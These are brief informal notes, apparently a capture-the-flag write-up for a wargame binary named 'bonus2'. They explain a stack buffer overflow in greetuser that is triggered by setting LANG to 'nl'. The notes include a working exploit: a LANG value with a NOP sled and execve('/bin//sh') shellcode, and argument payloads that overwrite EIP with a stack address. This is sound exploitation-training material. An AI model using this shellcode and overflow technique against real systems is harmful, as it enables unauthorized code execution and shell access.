sooo

we have some env language var from terminal  that will change if nl or fi
we have a bufferoverflow with 40 A 40 bs before call to greetuser.
eip seems to be overwritten wit 2 bs just after memcpy in call to greetuser
hehe if we go to nl we can override eip completetly thus taking control of code
exec
NETHERLANDS + SHELLCODE

with av1 long we print greetings then 40chars of a and then b

prgm breaks at a5 for 2nd arg with  av1 av2 size 40

export LANG=$(python -c "print 'nl' + '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

./bonus2 $(python -c "print 'A' * 40")  $(python -c "print 'B' * 23 + '\x8f\xfe\xff\xbf' + 'B' * 13")
